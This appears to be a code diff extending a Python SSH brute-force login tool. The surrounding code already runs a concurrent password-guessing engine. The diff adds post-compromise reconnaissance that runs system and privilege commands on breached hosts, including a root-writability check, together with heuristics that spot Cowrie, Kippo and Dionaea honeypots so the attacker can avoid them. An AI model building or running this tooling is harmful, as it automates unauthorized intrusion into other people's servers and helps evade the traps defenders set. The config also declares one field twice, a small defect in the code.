@@ -19,7 +19,7 @@ import contextlib
 import time
 from dataclasses import dataclass, field
 from pathlib import Path
-from typing import Dict, Iterable, List, Optional, Sequence, Set, Tuple
+from typing import Any, Dict, Iterable, List, Optional, Sequence, Set, Tuple
 
 try:
     import orjson  # type: ignore
@@ -54,6 +54,11 @@ class Config:
     log_interval: float = 5.0
     hang_timeout: float = 60.0  # seconds with no progress before declaring hang (0 disables)
     verbose: bool = False
+    require_ssh_banner: bool = True  # drop non-SSH listeners during probe unless disabled
+    gather_info: bool = False
+    honeypot_detect: bool = True
+    post_timeout: float = 5.0  # seconds budget for post-compromise info gathering
+    age_cache: Optional[Path] = None
     require_ssh_banner: bool = True  # drop non-SSH listeners during probe unless disabled
 
 
@@ -180,6 +185,32 @@ def dumps_json(record: dict) -> str:
     return json.dumps(record, ensure_ascii=False)
 
 
+def now_ts() -> float:
+    return time.time()
+
+
+def load_age_cache(path: Optional[Path]) -> Dict[str, float]:
+    if not path:
+        return {}
+    try:
+        data = json.loads(path.read_text())
+        if isinstance(data, dict):
+            return {str(k): float(v) for k, v in data.items()}
+    except Exception:
+        pass
+    return {}
+
+
+def save_age_cache(path: Optional[Path], cache: Dict[str, float]) -> None:
+    if not path:
+        return
+    try:
+        path.parent.mkdir(parents=True, exist_ok=True)
+        path.write_text(json.dumps(cache))
+    except Exception as exc:
+        print(f"[warn] failed to write age cache {path}: {exc}", flush=True)
+
+
 # -----------------------------------------------------------------------------
 # Networking helpers
 # -----------------------------------------------------------------------------
@@ -206,6 +237,159 @@ async def probe_port(host: str, port: int, timeout: float) -> Optional[str]:
 
 
 # -----------------------------------------------------------------------------
+# Post-compromise enrichment
+# -----------------------------------------------------------------------------
+
+
+def summarize_health(load_1: float, cores: int, mem_free: int, mem_total: int, disk_free: int, disk_total: int) -> Dict[str, Any]:
+    reasons = []
+    status = "good"
+    if cores > 0 and load_1 > cores * 2:
+        reasons.append(f"high load ({load_1} on {cores} cores)")
+    if mem_total > 0:
+        mem_free_pct = (mem_free / mem_total) * 100
+        if mem_free_pct < 5:
+            reasons.append(f"low memory ({mem_free_pct:.1f}% free)")
+    if disk_total > 0:
+        disk_free_pct = (disk_free / disk_total) * 100
+        if disk_free_pct < 5:
+            reasons.append(f"low disk ({disk_free_pct:.1f}% free)")
+    if reasons:
+        status = "warn"
+    return {"status": status, "reasons": reasons}
+
+
+async def run_cmd(conn: asyncssh.SSHClientConnection, cmd: str, timeout: float) -> Dict[str, Any]:
+    try:
+        res = await asyncio.wait_for(conn.run(cmd, check=False), timeout=timeout)
+        return {
+            "ok": res.exit_status == 0,
+            "stdout": res.stdout,
+            "stderr": res.stderr,
+            "exit_status": res.exit_status,
+        }
+    except Exception as exc:
+        return {"ok": False, "stdout": "", "stderr": str(exc), "exit_status": -1}
+
+
+async def gather_info(
+    conn: asyncssh.SSHClientConnection,
+    cfg: Config,
+    host_state: HostState,
+    state: Dict[str, Any],
+    state_lock: asyncio.Lock,
+) -> Dict[str, Any]:
+    async def do() -> Dict[str, Any]:
+        info: Dict[str, Any] = {}
+        ssh_info: Dict[str, Any] = {}
+
+        host_key = conn.get_server_host_key()
+        if host_key:
+            ssh_info["hostkey_fingerprint"] = host_key.get_fingerprint()
+            async with state_lock:
+                cache = state.setdefault("age_cache", {})
+                current_ts = now_ts()
+                first_seen = cache.get(ssh_info["hostkey_fingerprint"])
+                if not first_seen:
+                    first_seen = current_ts
+                    cache[ssh_info["hostkey_fingerprint"]] = first_seen
+                ssh_info["first_seen"] = first_seen
+                ssh_info["seen_before"] = first_seen < current_ts
+
+        if host_state.banner:
+            ssh_info["banner"] = host_state.banner
+        info["ssh"] = ssh_info
+
+        sysinfo_cmds = {
+            "uname": "uname -a",
+            "os_release": "cat /etc/os-release",
+            "load": "cat /proc/loadavg",
+            "mem": "cat /proc/meminfo",
+            "disk": "df -P /",
+            "uptime": "cat /proc/uptime",
+            "id": "id -u; whoami; test -w /root && echo root_writable || echo root_not_writable",
+            "nproc": "nproc",
+        }
+
+        cmd_results: Dict[str, Any] = {}
+        for key, cmd in sysinfo_cmds.items():
+            cmd_results[key] = await run_cmd(conn, cmd, timeout=cfg.read_timeout)
+        info["commands"] = cmd_results
+
+        try:
+            lines = [l.strip() for l in cmd_results["id"]["stdout"].splitlines() if l.strip()]
+            uid = int(lines[0]) if lines else None
+            user = lines[1] if len(lines) > 1 else None
+            root_writable = any("root_writable" in l for l in lines)
+            info["access"] = {"uid": uid, "user": user, "root_writable": root_writable}
+        except Exception:
+            info["access"] = {"error": "parse_failed"}
+
+        # Basic parsing
+        try:
+            load_parts = cmd_results["load"]["stdout"].split()
+            load_1 = float(load_parts[0]) if load_parts else 0.0
+        except Exception:
+            load_1 = 0.0
+        try:
+            meminfo = cmd_results["mem"]["stdout"]
+            mem_total = mem_free = 0
+            for line in meminfo.splitlines():
+                if line.startswith("MemTotal:"):
+                    mem_total = int(line.split()[1])
+                elif line.startswith("MemAvailable:"):
+                    mem_free = int(line.split()[1])
+            info["memory_kb"] = {"total": mem_total, "free": mem_free}
+        except Exception:
+            mem_total = mem_free = 0
+
+        disk_total = disk_free = 0
+        try:
+            lines = cmd_results["disk"]["stdout"].splitlines()
+            if len(lines) >= 2:
+                parts = lines[1].split()
+                if len(parts) >= 4:
+                    disk_total = int(parts[1])
+                    disk_free = int(parts[3])
+        except Exception:
+            pass
+
+        try:
+            cores = int(cmd_results["nproc"]["stdout"].strip().splitlines()[0])
+        except Exception:
+            cores = 1
+        info["health"] = summarize_health(load_1, cores, mem_free, mem_total, disk_free, disk_total)
+
+        if cfg.honeypot_detect:
+            hp_reasons = []
+            banner = host_state.banner or ssh_info.get("banner", "")
+            if banner and any(x in banner.lower() for x in ["cowrie", "kippo", "dionaea"]):
+                hp_reasons.append("honeypot-like banner")
+            uptime_out = cmd_results["uptime"]["stdout"]
+            try:
+                uptime_secs = float(uptime_out.split()[0])
+                if uptime_secs < 300 and banner and "openssh" in banner.lower():
+                    hp_reasons.append("very low uptime with normal banner")
+            except Exception:
+                pass
+            if cmd_results["id"]["exit_status"] != 0:
+                hp_reasons.append("basic command failures")
+            if hp_reasons:
+                info["honeypot"] = {"suspect": True, "reasons": hp_reasons}
+            else:
+                info["honeypot"] = {"suspect": False, "reasons": []}
+
+        return info
+
+    try:
+        return await asyncio.wait_for(do(), timeout=cfg.post_timeout)
+    except asyncio.TimeoutError:
+        return {"error": "post_timeout"}
+    except Exception as exc:
+        return {"error": str(exc)}
+
+
+# -----------------------------------------------------------------------------
 # Brute engine
 # -----------------------------------------------------------------------------
 
@@ -218,6 +402,8 @@ async def attempt_login(
     file_lock: asyncio.Lock,
     stats: Dict[str, float],
     stats_lock: asyncio.Lock,
+    state: Dict[str, Any],
+    state_lock: asyncio.Lock,
 ) -> None:
     if global_stop.is_set() or host_state.stop.is_set():
         return
@@ -278,6 +464,10 @@ async def attempt_login(
         if host_state.banner:
             record["banner"] = host_state.banner
 
+        if cfg.gather_info:
+            extra = await gather_info(conn, cfg, host_state, state, state_lock)
+            record.update(extra)
+
         async with file_lock:
             cfg.results_path.parent.mkdir(parents=True, exist_ok=True)
             with cfg.results_path.open("a", encoding="utf-8") as f:
@@ -301,6 +491,8 @@ async def worker(
     file_lock: asyncio.Lock,
     stats: Dict[str, float],
     stats_lock: asyncio.Lock,
+    state: Dict[str, Any],
+    state_lock: asyncio.Lock,
 ) -> None:
     while True:
         item = await queue.get()
@@ -318,7 +510,7 @@ async def worker(
         async with stats_lock:
             stats["active"] += 1
         try:
-            await attempt_login(item, cfg, host_states[item.host], global_stop, file_lock, stats, stats_lock)
+            await attempt_login(item, cfg, host_states[item.host], global_stop, file_lock, stats, stats_lock, state, state_lock)
         except Exception as exc:
             async with stats_lock:
                 stats["errors"] += 1
@@ -460,34 +652,33 @@ async def progress_reporter(
         rate = attempts / elapsed if elapsed > 0 else 0.0
         success_rate = successes / attempts if attempts else 0.0
         qsize = queue.qsize()
-        lines = [
-            "[status]",
-            f"  elapsed: {elapsed:.1f}s | rate: {rate:.2f}/s | idle: {idle:.1f}s",
-            f"  queue: {qsize} | pending-est: {pending} | active: {active}/{cfg.max_workers}",
-            f"  attempts: {attempts}/{total} | successes: {successes} | failures: {failures} | skipped: {skipped} | errors: {errors}",
-            f"  success-rate: {success_rate:.2%}",
-        ]
-        return "\n".join(lines)
+        return (
+            f"\r[status] elapsed {elapsed:.1f}s | rate {rate:.2f}/s | idle {idle:.1f}s | "
+            f"queue {qsize} pending~{pending} active {active}/{cfg.max_workers} | "
+            f"attempts {attempts}/{total} succ {successes} fail {failures} skip {skipped} err {errors} | "
+            f"success-rate {success_rate:.2%}"
+        )
 
     # Print immediately so users see status even before the first interval elapses.
-    print(await snapshot(time.monotonic()), flush=True)
+    print(await snapshot(time.monotonic()), end="", flush=True)
 
     while not stop.is_set():
         await asyncio.sleep(cfg.log_interval)
         now = time.monotonic()
-        print(await snapshot(now), flush=True)
+        print(await snapshot(now), end="", flush=True)
 
         async with stats_lock:
             idle = now - stats.get("last_progress", start_time)
             pending_now = max(stats.get("total", 0) - (stats.get("attempts", 0) + stats.get("skipped", 0)), 0)
         if cfg.hang_timeout > 0 and idle > cfg.hang_timeout and pending_now > 0:
             print(
-                f"[hang] No progress for {idle:.1f}s (threshold {cfg.hang_timeout}s). Draining queue and signaling stop.",
+                f"\n[hang] No progress for {idle:.1f}s (threshold {cfg.hang_timeout}s). Draining queue and signaling stop.",
                 flush=True,
             )
             stop.set()
             global_stop.set()
             drain_queue(queue)
+    print()  # newline after final status
 
 
 async def run(cfg: Config) -> None:
@@ -499,6 +690,8 @@ async def run(cfg: Config) -> None:
     global_stop = asyncio.Event()
     file_lock = asyncio.Lock()
     stats_lock = asyncio.Lock()
+    state_lock = asyncio.Lock()
+    state: Dict[str, Any] = {"age_cache": load_age_cache(cfg.age_cache)}
     stats: Dict[str, float] = {
         "attempts": 0,
         "successes": 0,
@@ -511,7 +704,7 @@ async def run(cfg: Config) -> None:
     }
 
     workers = [
-        asyncio.create_task(worker(queue, cfg, host_states, global_stop, file_lock, stats, stats_lock))
+        asyncio.create_task(worker(queue, cfg, host_states, global_stop, file_lock, stats, stats_lock, state, state_lock))
         for _ in range(cfg.max_workers)
     ]
     reporter_stop = asyncio.Event()
@@ -528,6 +721,8 @@ async def run(cfg: Config) -> None:
         w.cancel()
     with contextlib.suppress(Exception):
         await asyncio.gather(*workers)
+    with contextlib.suppress(Exception):
+        save_age_cache(cfg.age_cache, state.get("age_cache", {}))
 
 
 # -----------------------------------------------------------------------------
@@ -567,12 +762,22 @@ def build_parser() -> argparse.ArgumentParser:
     p.add_argument("--results", default="results.jsonl", help="path to JSONL output")
     p.add_argument("--verbose", action="store_true", help="print per-attempt warnings/errors")
     p.add_argument("--allow-non-ssh", action="store_true", help="include non-SSH listeners detected during probe")
+    p.add_argument("--gather-info", action="store_true", help="collect system info on successful auth")
+    p.add_argument("--no-honeypot-detect", action="store_true", help="disable honeypot heuristics")
+    p.add_argument("--post-timeout", type=float, default=5.0, help="timeout budget for post-auth info collection")
+    p.add_argument("--age-cache", help="path to hostkey first-seen cache (json)")
     return p
 
 
 def main(argv: Optional[Sequence[str]] = None) -> None:
     parser = build_parser()
     args = parser.parse_args(argv)
+
+    results_target = args.results
+    if not results_target or results_target == "results.jsonl":
+        results_target = f"results-{int(time.time())}.jsonl"
+    results_path = Path(results_target)
+    age_cache_path = Path(args.age_cache) if args.age_cache else (Path("age-cache.json") if args.gather_info else None)
 
     cfg = Config(
         targets=collect_targets(args),
@@ -589,11 +794,15 @@ def main(argv: Optional[Sequence[str]] = None) -> None:
         capture_banner=args.banner,
         probe=not args.no_probe,
         shuffle=not args.no_shuffle,
-        results_path=Path(args.results),
+        results_path=results_path,
         log_interval=args.log_interval,
         hang_timeout=args.hang_timeout,
         verbose=args.verbose,
         require_ssh_banner=not args.allow_non_ssh,
+        gather_info=args.gather_info,
+        honeypot_detect=not args.no_honeypot_detect,
+        post_timeout=args.post_timeout,
+        age_cache=age_cache_path,
     )
 
     try:
